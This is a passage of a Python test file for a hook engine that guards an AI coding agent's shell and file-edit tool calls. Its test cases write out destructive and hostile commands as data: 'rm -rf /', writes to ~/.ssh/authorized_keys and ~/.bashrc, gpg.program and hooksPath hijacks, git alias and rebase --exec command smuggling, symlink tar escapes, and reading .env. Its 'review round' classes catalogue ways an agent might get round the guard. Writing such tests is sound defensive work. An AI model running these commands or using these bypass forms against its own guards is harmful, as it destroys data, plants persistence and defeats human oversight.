            (lambda: self.bash("git config gpg.program /tmp/x"), "G-TOOL-05"),
            (lambda: self.bash("gh api -X PUT repos/o/r/pulls/1/merge"), "G-MERGE-01"),
            (lambda: self.bash("echo x > .aiops/config/protected-paths"), "G-ART-05"),
            (lambda: self.bash("pip install requests"), "G-LOCK-06"),
            (lambda: self.bash("make format"), "G-LOCK-07"),
            (lambda: self.bash("git stash"), "G-LOCK-03"),
            (lambda: self.bash("echo x > .env"), "G-SEC-02"),
            (lambda: self.bash("echo x > package-lock.json"), "G-FILE-01"),
            (lambda: self.bash("git rm .aiops/0001-csv-export/intent.md"), "G-ART-08"),
            (lambda: self.bash("git checkout main -- ."), "G-FILE-02"),
            (lambda: self.bash("git checkout -- package-lock.json"), "G-FILE-03"),
            (lambda: self.bash("cat fix.diff | patch -p1"), "G-ART-06"),
            (lambda: self.bash("cat fix.diff | git apply"), "G-ART-07"),
            (lambda: self.bash("git add src/app.py"), "G-LOCK-04"),
            (lambda: self.bash("tar -xf x.tar -C /tmp/out"), "G-LOCK-08"),
            (lambda: self.bash(f"echo x > {ROOT}/lib/x.py"), "G-TOOL-02"),
            (lambda: self.bash("echo x > /tmp/elsewhere/.ssh/config"), "G-SEC-01"),
            (lambda: self.bash("echo x > ~/.bashrc"), "G-TOOL-04"),
        ]
        for run, rid in cases:
            with self.subTest(rid=rid):
                self.assertId(run(), rid)

    def test_artifact_field_rules(self):
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md",
                                INTENT.format(id="0001").replace("created:", "approved-by: x\ncreated:")), "G-GATE-03")
        self.write("intent", INTENT)
        text = (self.d / "intent.md").read_text()
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md", text.replace("created:", "approved-by: x\ncreated:")),
                      "G-GATE-04")
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md", text.replace("id: 0001\n", "")), "G-ART-03")

    def test_commit_of_code_and_crash(self):
        (self.root / "src" / "app.py").write_text("x = 2\n")
        self.assertId(self.bash("git commit -a -m x"), "G-LOCK-05")
        r = self.hook("pre-bash", {"tool_name": "Bash", "tool_input": "not an object", "cwd": str(self.root)})
        self.assertId(r, "G-FAIL-01")

    def test_merge_on_main_and_scaffold_elsewhere(self):
        git(self.root, "switch", "-q", "main")
        self.assertId(self.bash("git merge feat/0001-csv-export"), "G-MERGE-02")
        import tempfile
        with tempfile.TemporaryDirectory() as other:
            git(other, "init", "-q")
            r = self.bash("sdlc init", cwd=other, env={"CLAUDE_PROJECT_DIR": str(self.root)})
            self.assertId(r, "G-SCAF-01")

    def test_post_edit_validation_carries_id(self):
        self.write("intent", INTENT.replace("## Problem", "## Issue"))
        r = self.hook("post-edit", self.hook_input("Write", file_path=str(self.d / "intent.md")))
        self.assertEqual(r.returncode, 2)
        # PostToolUse: the edit was saved, so this is feedback, not a block
        self.assertRegex(r.stderr, r"^NOT VALID \[G-ART-09\] by zouj-ai-sdlc: ")
        self.assertNotIn("BLOCKED", r.stderr)
        self.assertIn("was saved", r.stderr)
        self.assertIn("sdlc why G-ART-09", r.stderr)

    def test_secret_scan_carries_id(self):
        import subprocess
        import sys
        from helpers import ROOT
        (self.root / ".env").write_text("TOKEN=x\n")
        r = subprocess.run([sys.executable, "-I", "-c", "import sys; sys.path.insert(0, sys.argv[1])\n"
                            "from sdlc_engine.secret_scan import main; sys.exit(main())", str(ROOT / "lib")],
                           input=__import__("json").dumps(self.hook_input("Bash", command="cat .env")),
                           capture_output=True, text=True, cwd=self.root)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertRegex(r.stderr, r"^BLOCKED \[G-SEC-03\] by guard-bash: ")
        self.assertIn("sdlc why G-SEC-03", r.stderr)


class InstallState(RepoCase):
    """.aiops/install-state.json is engine-written: the agent's Edit/Write and shell writes are blocked (0004 S8)."""
    def test_agent_cannot_write_it(self):
        import re
        import subprocess
        from helpers import ROOT
        path = str(self.root / ".aiops" / "install-state.json")
        # the exact ids (AC-15, review round 2): the engine's own rules for .aiops/ fire first; guard-files adds G-FILE-04
        for r, rid in ((self.hook("pre-edit", self.hook_input("Write", file_path=path, content="{}")), "G-ART-01"),
                       (self.hook("pre-bash", self.hook_input("Bash", command="echo '{}' > .aiops/install-state.json")),
                        "G-ART-05"),
                       (self.hook("pre-bash", self.hook_input("Bash", command="rm .aiops/install-state.json")), "G-ART-05")):
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn(f"[{rid}]", r.stderr)
        files = subprocess.run([str(ROOT / "hooks" / "guard-files.sh")], capture_output=True, text=True,
                               input=json.dumps({"tool_input": {"file_path": path, "content": "{}"}}),
                               env={**self.env, "CLAUDE_PROJECT_DIR": str(self.root), "CLAUDE_PLUGIN_ROOT": str(ROOT)})
        self.assertEqual(files.returncode, 2, files.stderr)
        self.assertTrue(re.search(r"\[G-FILE-04\]", files.stderr), files.stderr)


class Lifecycle(RepoCase):
    """The agent's upgrade/repair/uninstall: only in the session's repo; a real uninstall is human-only (0004 S15)."""
    def bash(self, cmd):
        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})

    def test_uninstall_human_only(self):
        for cmd in ("sdlc uninstall", "sdlc uninstall --yes", "bin/sdlc uninstall", "make x; sdlc uninstall"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, cmd)
            self.assertIn("[G-GATE-07]", r.stderr, cmd)
        for cmd in ("sdlc uninstall --yes # --dry-run", "sdlc uninstall #--dry-run"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, cmd)
            self.assertIn("[G-GATE-07]", r.stderr, cmd)
        for cmd in ("sdlc uninstall --dry-run", "sdlc uninstall --yes --dry-run", "sdlc list-installed",
                    "sdlc why G-GATE-07"):
            self.assertEqual(self.bash(cmd).returncode, 0, cmd)

    def test_other_repo_refused(self):
        for cmd in ("SDLC_HOOK_PROFILE=spike sdlc repair --yes", "AIOPS_INTENT=0009 sdlc upgrade --yes",
                    "export SDLC_HOOK_PROFILE=spike; sdlc repair",
                    "cd ../other && sdlc upgrade --yes", "GIT_DIR=x sdlc repair", "env -C ../x sdlc repair",
                    "HOME=/tmp/h sdlc upgrade"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, cmd)
            self.assertIn("[G-SCAF-01]", r.stderr, cmd)
        for cmd in ("sdlc upgrade --yes", "sdlc repair --dry-run"):
            self.assertEqual(self.bash(cmd).returncode, 0, cmd)


class Uninitialized(RepoCase):
    """0005 S4 (gap 2): in a repo without .aiops/, shell writes to the toolchain, the plugin and secrets outside the
    repo are blocked through hooks/engine.sh pre-bash; the SDLC gates stay dormant."""
    def setUp(self):
        super().setUp()
        import shutil
        shutil.rmtree(self.root / ".aiops")

    def engine(self, cmd):
        import subprocess
        from helpers import ROOT
        env = {**self.env, "CLAUDE_PROJECT_DIR": str(self.root), "CLAUDE_PLUGIN_ROOT": str(ROOT)}
        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
                              input=json.dumps(self.hook_input("Bash", command=cmd)), env=env, cwd=self.root)

    def test_safety_pass_blocks(self):
        from helpers import ROOT
        for cmd, rid in [("echo x >> ~/.gitconfig", "G-TOOL-04"), ("echo x >> ~/.bashrc", "G-TOOL-04"),
                         ("echo x >> ~/.ssh/authorized_keys", "G-SEC-01"),
                         (f"echo x > {ROOT}/lib/sdlc_engine/x.py", "G-TOOL-02"),
                         ("git config --global gpg.ssh.program /tmp/x", "G-TOOL-05"),
                         ("echo x > .env.local", "G-SEC-01"),          # secrets: every repo (review round 1)
                         ("bash -c 'echo x >> ~/.bashrc'", "G-TOOL-04")]:
            r = self.engine(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
            self.assertIn(f"[{rid}]", r.stderr, cmd)

    def test_gates_stay_dormant(self):
        for cmd in ("rm -rf src", "echo x > src/a.py", "git push origin main", "git config user.name x",
                    "git merge feat/x"):
            r = self.engine(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stdout}{r.stderr}")


class ProtectedTree(RepoCase):
    """0005 S5 (gap 1): deleting or moving a directory that holds the repo, .aiops/.git, a protected path or a
    tracked secret is blocked in every state; ordinary deletes stay allowed."""
    def setUp(self):
        super().setUp()
        self.to_execution()                                           # state 4: the read-only lock is off
        for rel in (".github/workflows/aiops-gates.yml", ".claude/settings.json", "docs/CODEOWNERS", "build/out.o"):
            (self.root / rel).parent.mkdir(parents=True, exist_ok=True)
            (self.root / rel).write_text("x\n")
        (self.root / ".aiops" / "config" / "protected-paths").write_text("docs/CODEOWNERS ownership is human-owned\n")

    def bash(self, cmd):
        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})

    def test_blocks_in_unlocked_state(self):
        for cmd in ("rm -rf ./", "rm -rf -- .", 'rm -rf "$PWD"', f"rm -rf {self.root}", "rm -rf ..", "rm -rf ~/",
                    "rm -rf /", "rm -rf .github/workflows", "mv .github /tmp/x", "rm -rf .claude", "rm -rf .aiops",
                    "rm -rf .git", "rm -rf docs", "rmdir .github", "find .github -delete", "find . -delete"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, cmd)
            want = "G-ART-05" if ".aiops" in cmd else "G-TOOL-03" if ".git " in cmd + " " else "G-FILE-05"
            self.assertIn(f"[{want}]", r.stderr, cmd)                    # AC-1: the exact id (review round 1)
            self.assertIn("Procedure:", r.stderr, cmd)

    def test_allows_ordinary_deletes(self):
        import time
        nm = self.root / "node_modules"
        for i in range(100):
            d = nm / f"p{i}"
            d.mkdir(parents=True)
            for j in range(100):
                (d / f"f{j}.js").write_text("")
        for cmd in ("rm -rf build/", "rm src/app.py", "cp README.md docs/", "mv src/app.py src/b.py",
                    "find . -name '*.pyc' -delete", "find build -type f -delete"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
        t = time.monotonic()
        r = self.bash("rm -rf node_modules")
        took = time.monotonic() - t
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertLess(took, 2.0, "the hook itself starts python; the tree check must not walk node_modules")
        from sdlc_engine import guards
        t = time.monotonic()
        self.assertIsNone(guards._contains_protected(self.root, "node_modules", self.root))
        self.assertLess(time.monotonic() - t, 0.2)

    def test_tracked_secret_dir(self):
        (self.root / "config").mkdir()
        (self.root / "config" / "prod.key").write_text("k\n")
        git(self.root, "add", "-f", "config/prod.key")
        git(self.root, "commit", "-qm", "key")
        r = self.bash("rm -rf config")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("[G-FILE-05]", r.stderr)


class Incoming(RepoCase):
    """0005 S6-S7 (gap 4): archives, stashes, merges and pulls can't bring in protected config (G-FILE-06)."""
    def setUp(self):
        super().setUp()
        self.to_execution()                                           # state 4: unlocked

    def bash(self, cmd):
        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})

    def archive(self, name, members):
        import io
        import tarfile
        import zipfile
        f = self.root / name
        if name.endswith(".zip"):
            with zipfile.ZipFile(f, "w") as z:
                for m in members:
                    z.writestr(m, "x\n")
        else:
            with tarfile.open(f, "w:gz") as t:
                for m in members:
                    info = tarfile.TarInfo(m)
                    info.size = 2
                    t.addfile(info, io.BytesIO(b"x\n"))

    def assertBlocked(self, cmd, rid="G-FILE-06"):
        r = self.bash(cmd)
        self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
        self.assertIn(f"[{rid}]", r.stderr, cmd)

    def test_archives(self):
        self.archive("bad.tgz", ["src/a.py", ".aiops/config/allowed-commands"])
        self.archive("bad.zip", ["src/a.py", ".claude/settings.json"])
        self.archive("ci.tgz", ["./.github/workflows/aiops-gates.yml"])
        self.archive("good.tgz", ["src/a.py", "src/b.py"])
        self.archive("good.zip", ["src/c.py"])
        for cmd in ("tar -xzf bad.tgz", "tar xzf bad.tgz", "tar -x -f bad.tgz", "unzip bad.zip", "unzip -o bad.zip",
                    "tar -xzf ci.tgz", "tar -xzf missing.tgz", "unzip missing.zip"):
            self.assertBlocked(cmd)
        for cmd in ("tar -xzf good.tgz", "unzip good.zip", "tar -tzf bad.tgz", "unzip -l bad.zip",
                    "tar -xzf bad.tgz -C /tmp/elsewhere"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def commit_on(self, branch, rel, text, base=None):
        git(self.root, "switch", "-qc", branch, *([base] if base else []))
        (self.root / rel).parent.mkdir(parents=True, exist_ok=True)
        (self.root / rel).write_text(text)
        git(self.root, "add", "-f", rel)
        git(self.root, "commit", "-qm", f"change {rel}")
        sha = git(self.root, "rev-parse", "HEAD")
        git(self.root, "switch", "-q", "feat/0001-csv-export")
        return sha

    def test_stash(self):
        cfg = self.root / ".aiops" / "config" / "protected-paths"
        cfg.write_text("legacy/* frozen\n")
        git(self.root, "add", "-f", ".aiops/config/protected-paths")
        git(self.root, "commit", "-qm", "track config")
        cfg.write_text("")                                             # stash@{1}: a change to protected config
        git(self.root, "stash", "-q")
        (self.root / "src" / "app.py").write_text("x = 3\n")          # stash@{0}: code only
        git(self.root, "stash", "-q")
        self.assertEqual(self.bash("git stash pop").returncode, 0)
        self.assertBlocked("git stash apply stash@{1}")
        self.assertBlocked("git stash pop 'stash@{1}'")

    def test_merge_rebase_cherry_pick(self):
        bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
        self.commit_on("approvals", ".aiops/0001-csv-export/plan.md",
                       (self.d / "plan.md").read_text() + "\n")
        main_change = self.commit_on("tmp-main", ".aiops/config.json", "{}\n", base="main")
        git(self.root, "branch", "-qf", "main", main_change)
        git(self.root, "update-ref", "refs/remotes/origin/main", main_change)
        for cmd in ("git merge x", "git rebase x", f"git cherry-pick {bad}", "git merge --no-ff x", "git merge nosuch"):
            self.assertBlocked(cmd)
        for cmd in ("git merge main", "git merge origin/main", "git rebase origin/main", "git merge approvals",
                    "git merge --abort", "git rebase --continue"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_pull(self):
        r = self.bash("git pull")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("[G-FILE-06]", r.stderr)
        self.assertIn("git fetch", r.stderr)
        self.assertBlocked("git pull origin feat/0001-csv-export")
        git(self.root, "switch", "-q", "main")
        self.assertNotIn("[G-FILE-06]", self.bash("git pull").stderr)        # on main: only the usual lock applies
        self.assertNotIn("[G-FILE-06]", self.bash("git pull origin main").stderr)
        for cmd in ("git pull origin x", "git pull . x", "git pull --rebase origin x"):   # round 1: only main itself
            self.assertIn("[G-FILE-06]", self.bash(cmd).stderr, cmd)


class Wrappers(RepoCase):
    """0005 review round 1: a wrapper prefix (nice, timeout 5, stdbuf, sudo -u x, …) doesn't hide a write."""
    def bash(self, cmd):
        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})

    def test_wrappers_are_seen_through(self):
        self.write("intent", INTENT)                                  # state 1: code is locked
        for cmd in ("timeout 5 rm -rf .aiops", "nice tee .aiops/config/readonly-exempt", "echo x | nice tee src/app.py",
                    "timeout 5 sh -c 'echo x > src/app.py'", "nice -n 5 rm src/app.py", "stdbuf -o0 tee src/app.py",
                    "setsid rm src/app.py", "ionice -c3 rm src/app.py", "command -p rm src/app.py",
                    "sudo -u me rm src/app.py", "flock /tmp/l rm src/app.py", "timeout -s KILL 5 rm src/app.py",
                    "nohup rm src/app.py", "time -p rm src/app.py", "busybox rm src/app.py", "xargs -n 1 rm src/app.py"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, cmd)
        self.to_execution_from_intent()
        for cmd in ("timeout 60 make check", "nice -n 5 python -m pytest", "time ls"):
            self.assertEqual(self.bash(cmd).returncode, 0, cmd)

    def to_execution_from_intent(self):
        self.approve("intent")
        self.write("spec", SPEC)
        self.approve("spec")
        self.write("plan", PLAN)
        self.approve("plan")


class UninitializedRound1(Uninitialized):
    """0005 review round 1: the safety pass at a $HOME session root, git config forms, copies into home."""
    test_safety_pass_blocks = test_gates_stay_dormant = None

    def engine_at(self, cmd, cwd, home):
        import subprocess
        from helpers import ROOT
        env = {**self.env, "CLAUDE_PROJECT_DIR": str(cwd), "CLAUDE_PLUGIN_ROOT": str(ROOT), "HOME": str(home)}
        payload = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(cwd)}
        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
                              input=json.dumps(payload), env=env, cwd=cwd)

    def test_session_at_home(self):
        import tempfile
        from pathlib import Path
        with tempfile.TemporaryDirectory() as h:
            home = Path(h)
            git(home, "init", "-q")                                   # a dotfiles repo at $HOME
            for cmd, rid in [("echo x >> ~/.bashrc", "G-TOOL-04"), ("echo x >> ~/.ssh/authorized_keys", "G-SEC-01"),
                             ("echo x >> .bashrc", "G-TOOL-04")]:
                r = self.engine_at(cmd, home, home)
                self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
                self.assertIn(f"[{rid}]", r.stderr, cmd)

    def test_git_config_forms(self):
        for cmd in ("git config --glob gpg.ssh.program /tmp/x", "git config --syst gpg.program /tmp/x",
                    "git config -f ~/.gitconfig gpg.ssh.program /tmp/x",
                    "git config --file=~/.gitconfig core.hooksPath /x",
                    "GIT_CONFIG=/tmp/c git config gpg.program y", "GIT_CONFIG_GLOBAL=/tmp/c git config user.signingkey y",
                    "nice git config --global gpg.program /tmp/x"):
            r = self.engine(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
            self.assertIn("[G-TOOL-05]", r.stderr, cmd)
        self.assertEqual(self.engine("git config user.name x").returncode, 0)
        self.assertEqual(self.engine("git config -f .git/x.cfg user.name x").returncode, 0)

    def test_copies_into_home(self):
        for cmd in ("cp -r /tmp/dot/. ~/", "rsync -a /tmp/dot/ ~/", "tar -xzf home.tgz -C ~",
                    "unzip plug.zip -d ~/.claude", "cp x ~/.config/git/", "nice cp -r /tmp/dot/. ~/"):
            r = self.engine(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
        for cmd in ("cp a.txt /tmp/out/", "tar -xzf a.tgz -C /tmp/out", "cp src/app.py /tmp/x.py"):
            self.assertEqual(self.engine(cmd).returncode, 0, cmd)


class IncomingRound1(Incoming):
    """0005 review round 1: every merge/rebase operand, value options, cherry-pick ranges, archive tricks."""
    test_archives = test_stash = test_merge_rebase_cherry_pick = test_pull = None

    def setUp(self):
        super().setUp()
        self.bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
        self.commit_on("approvals", ".aiops/0001-csv-export/plan.md", (self.d / "plan.md").read_text() + "\n")

    def test_every_operand_and_value_options(self):
        for cmd in ("git merge main x", "git merge origin/main x", "git rebase main x", "git merge -m main x",
                    "git cherry-pick ^HEAD x", f"git cherry-pick -m 1 {self.bad}", "git merge -X theirs x",
                    "git merge --strategy=ours x"):
            self.assertBlocked(cmd)
        for cmd in ('git merge -m "merge it" approvals', "git merge -X theirs approvals", "git merge -s ours main",
                    "git merge --no-ff -m 'Merge main' main", "git rebase", "git merge --no-edit approvals",
                    "git cherry-pick -x approvals"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_archive_tricks(self):
        import io
        import tarfile
        self.archive("strip.tgz", ["pkg/src/a.py", "pkg/.aiops/config/allowed-commands"])
        self.archive("ok.tgz", ["pkg/src/a.py"])
        with tarfile.open(self.root / "link.tgz", "w:gz") as t:              # a symlink member, then a file through it
            lnk = tarfile.TarInfo("l")
            lnk.type, lnk.linkname = tarfile.SYMTYPE, ".aiops/config"
            t.addfile(lnk)
            info = tarfile.TarInfo("l/allowed-commands")
            info.size = 2
            t.addfile(info, io.BytesIO(b"x\n"))
        self.archive("via.tgz", ["l2/allowed-commands"])
        (self.root / "l2").symlink_to(self.root / ".aiops" / "config")      # an existing in-repo symlink
        for cmd in ("tar -xzf strip.tgz --strip-components=1", "tar -xzf strip.tgz --strip-components 1",
                    "tar -xzf link.tgz", "tar -xzf via.tgz", "tar -xzf ok.tgz --transform s/a/b/",
                    "tar -xzPf ok.tgz", "busybox tar -xzf strip.tgz --strip-components=1"):
            self.assertBlocked(cmd)
        for cmd in ("tar -xzf ok.tgz --strip-components=1", "tar xfz ok.tgz"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")


class ProtectedTreeRound1(ProtectedTree):
    """0005 review round 1: filtered find, -exec, pushd, a symlink made in the same command, rsync --delete."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def test_more_forms_blocked(self):
        for cmd in ("find .github -type f -delete", "find .github -name '*.yml' -delete",
                    "find docs -name CODEOWNERS -delete", "find .github -exec rm -rf {} +",
                    "ln -s .github q && rm -rf q/", "pushd .github && rm -rf workflows",
                    "rsync -a --delete build/ .github/workflows/", "find . -name 'aiops-gates.yml' -delete"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
            self.assertIn("[G-FILE-05]", r.stderr, cmd)

    def test_still_allowed(self):
        (self.root / "gh").symlink_to(self.root / ".github")
        for cmd in ("rm -rf gh", "rm gh", "find . -name '*.pyc' -delete", "find build -type f -delete",
                    "find docs -name '*.tmp' -delete", "rsync -a --delete src/ build/", "pushd build && rm -rf out.o"):
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")


class Round2(ProtectedTree):
    """0005 review round 2: close each bypass class, and the false positives round 1 introduced."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def blocked(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")

    def allowed(self, cmds):
        for cmd in cmds:
            r = self.bash(cmd)
            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")

    def test_nested_and_wrapper_forms(self):
        self.blocked(["trap 'rm -rf docs' EXIT", "coproc rm -rf docs", "watch -n1 rm -rf docs",
                      "parallel rm -rf ::: docs", "flock /tmp/l -c 'rm -rf docs'", "flock -c 'rm -rf docs' /tmp/l",
                      "find .github -exec sh -c 'rm \"$1\"' _ {} \\;", "find .github -name '*.yml' -exec nice rm {} +",
                      "git -c alias.zz='!rm -rf .github' zz", "git rebase --exec 'rm -rf .github' main",
                      "git rebase -x 'rm -rf .github' main"])
        self.allowed(["trap 'echo done' EXIT", "watch -n1 ls", "git rebase --exec 'make test' main",
                      "find . -name '*.py' -exec grep -l TODO {} +"])

    def test_negated_find(self):
        self.blocked(["find .github -not -name x -delete", "find .github ! -name x -delete",
                      "find .github -name x -o -delete", "find . -atime +30 -delete"])
        self.allowed(["find . -type d -empty -delete", "find build -type d -delete", "find . -name '*.pyc' -delete"])

    def test_links_made_in_the_same_command(self):
        self.blocked(["ln -s .github q && rm -rf q/workflows", "ln -s .github q && rm -rf q/*",
                      "ln -s .github q && mv q/workflows /tmp/x", "ln -s . q && rm -rf q/.github",
                      "ln -s .aiops/config d && tar -xzf x.tgz -C d"])

    def test_rsync_and_tar_forms(self):
        self.blocked(["rsync -a --del build/ .github/workflows/",
                      "rsync -a --delete build/ .github/workflows/ --exclude foo",
                      "rsync --remove-source-files .github/workflows/ /tmp/x",
                      "tar -xzf x.tgz --one-top-level=.aiops/config"])
        self.allowed(["rsync -a --delete --exclude .git src/ build/"])

    def test_same_command_time_of_check(self):
        self.archive("good.tgz", ["src/a.py"])
        git(self.root, "branch", "benign")
        self.blocked(["cp /tmp/evil.tgz good.tgz && tar -xzf good.tgz", "git branch -f benign x && git merge benign",
                      "git update-ref refs/heads/benign HEAD~1 && git merge benign", "echo HEAD | git cherry-pick --stdin"])
        self.allowed(["tar -xzf good.tgz"])

    def archive(self, name, members):
        Incoming.archive(self, name, members)

    def test_cherry_pick_stuck_mainline(self):
        self.blocked(["git cherry-pick -m2 nosuch"])

    def test_pull_on_main_with_config(self):
        git(self.root, "switch", "-q", "main")
        for cmd in ("git -c branch.main.merge=refs/heads/x -c branch.main.remote=. pull",
                    "git -c remote.origin.url=/tmp/evil pull origin main", "git branch -u x && git pull"):
            self.assertIn("[G-FILE-06]", self.bash(cmd).stderr, cmd)

    def test_git_config_option_forms_initialized(self):
        self.blocked(["git config --fil ~/.gitconfig gpg.ssh.program /tmp/x",
                      "git config --fil=.git/config core.fsmonitor /tmp/x", "git config -f.git/config core.hooksPath x"])

    def test_writes_into_home(self):
        self.blocked(["git clone /tmp/evil ~/.config/git", "git --work-tree=$HOME checkout HEAD -- .bashrc",
                      "wget -P ~/.config/git https://x/y", "curl --output-dir ~/.config/git -O https://x/y"])
        self.allowed(["git clone https://x/y /tmp/y", "wget -P /tmp/dl https://x/y"])

    def test_link_member_archives_in_subdirs(self):
        import io
        import tarfile
        with tarfile.open(self.root / "node.tgz", "w:gz") as t:
            lnk = tarfile.TarInfo("node/bin/npm")
            lnk.type, lnk.linkname = tarfile.SYMTYPE, "../lib/npm/cli.js"
            t.addfile(lnk)
            info = tarfile.TarInfo("node/lib/npm/cli.js")
            info.size = 2
            t.addfile(info, io.BytesIO(b"x\n"))
        with tarfile.open(self.root / "escape.tgz", "w:gz") as t:
            lnk = tarfile.TarInfo("e")
            lnk.type, lnk.linkname = tarfile.SYMTYPE, "../../.aiops/config"
            t.addfile(lnk)
        (self.root / "vendor").mkdir()
        self.allowed(["tar -xzf node.tgz -C vendor"])
        self.blocked(["tar -xzf node.tgz", "tar -xzf escape.tgz -C vendor"])

    def test_stash_pop_without_stash_is_left_to_git(self):
        self.allowed(["git stash pop"])


class Round2Timing(RepoCase):
    def test_check_bash_decides_fast_and_pull_on_main_passes(self):
        import time
        from sdlc_engine import guards
        self.to_execution()                                           # state 4: unlocked
        nm = self.root / "node_modules"
        for i in range(50):
            (nm / f"p{i}").mkdir(parents=True)
            for j in range(200):
                (nm / f"p{i}" / f"f{j}.js").write_text("")
        t = time.monotonic()
        self.assertIsNone(guards.check_bash({"tool_input": {"command": "rm -rf node_modules"}, "cwd": str(self.root)}))
        self.assertLess(time.monotonic() - t, 0.2, "AC-2: the whole engine decision, in process")
        cfg = self.root / ".aiops" / "config.json"
        cfg.write_text('{"approval_key_policy": "any", "lock_when_idle": false}')
        git(self.root, "switch", "-q", "main")
        self.assertIsNone(guards.check_bash({"tool_input": {"command": "git pull"}, "cwd": str(self.root)}))   # AC-8


class SafetyPassFuzz(Uninitialized):
    """The safety pass runs on every Bash call in every repo and fails closed on a crash: common commands must
    neither crash it nor be blocked."""
    test_safety_pass_blocks = test_gates_stay_dormant = None

    def test_common_commands(self):
        from sdlc_engine import guards
        cmds = ["ls -la", "git status", "make test", "npm install", "pip install -e .", "python -m pytest -q",
                "cat <<'EOF' > notes.md\nhello\nEOF", "for f in *.py; do echo $f; done", "case $x in a) ls;; esac",
                "echo $((1+2))", "echo $'a\\tb'", "cd src && ls", "(cd build && make)", "{ ls; pwd; } > out.txt",
                "x=1; echo $x", "tar czf out.tgz src", "find . -name '*.py' | xargs wc -l", "grep -rn TODO src",
                "docker build -t x .", "git log --oneline -5 | cat", "timeout 60 make check", "time make",
                "cp a.txt b.txt", "mv a.txt b.txt", "rm -f b.txt", "mkdir -p out && touch out/x", "sed -n 1,5p f",
                "awk '{print $1}' f", "curl -s https://x/y -o out.json", "node -e 'console.log(1)'", "echo done &",
                "exec 3>/tmp/f", "set -euo pipefail", "export FOO=1", "source .venv/bin/activate", "unset FOO",
                "true && false || echo x", "! ls", "ls | tee log.txt", "cp -r src/ .", "tar xzf a.tgz"]
        for cmd in cmds:
            with self.subTest(cmd=cmd[:30]):
                out = guards.check_bash({"tool_input": {"command": cmd}, "cwd": str(self.root)})
                self.assertIsNone(out, f"{cmd}: {out}")

    def test_venv_on_path_does_not_block_copies(self):
        import os
        venv = self.root / ".venv" / "bin"
        venv.mkdir(parents=True)
        r = self.engine_env("cp -r dist/ ./", {"PATH": f"{venv}:{os.environ.get('PATH', '')}"})
        self.assertEqual(r.returncode, 0, r.stderr)

    def engine_env(self, cmd, extra):
        import subprocess
        from helpers import ROOT
        env = {**self.env, "CLAUDE_PROJECT_DIR": str(self.root), "CLAUDE_PLUGIN_ROOT": str(ROOT), **extra}
        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
                              input=json.dumps(self.hook_input("Bash", command=cmd)), env=env, cwd=self.root)


class TokenizerKeywords(ProtectedTree):
    """Review round 3 BLOCKER: after a shell keyword or a function header, `!` and `{` are in command position again;
    every row is blocked on main with the same id."""
    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None

    def test_keywords_put_bang_and_brace_back_in_command_position(self):
        for cmd, rid in [("if ! rm -rf .aiops; then :; fi", "G-ART-05"), ("while ! rm -rf .aiops; do :; done", "G-ART-05"),
                         ("if ! cp x .aiops/config.json; then :; fi", "G-ART-05"), ("then ! rm -rf .aiops", "G-ART-05"),
                         ("if true; then { rm -rf .aiops; }; fi", "G-ART-05"),
                         ("for i in 1; do { rm -rf .aiops; }; done", "G-ART-05"),
                         ("if false; then :; else { rm -rf .aiops; }; fi", "G-ART-05"),
                         ("time { rm -rf .aiops; }", "G-ART-05"), ("f(){ rm -rf .aiops; }; f", "G-ART-05"),
                         ("until ! rm -rf .github; do :; done", "G-FILE-05"), ("elif ! mv .github /tmp/x; then :; fi", "G-FILE-05")]:
            r = self.bash(cmd)
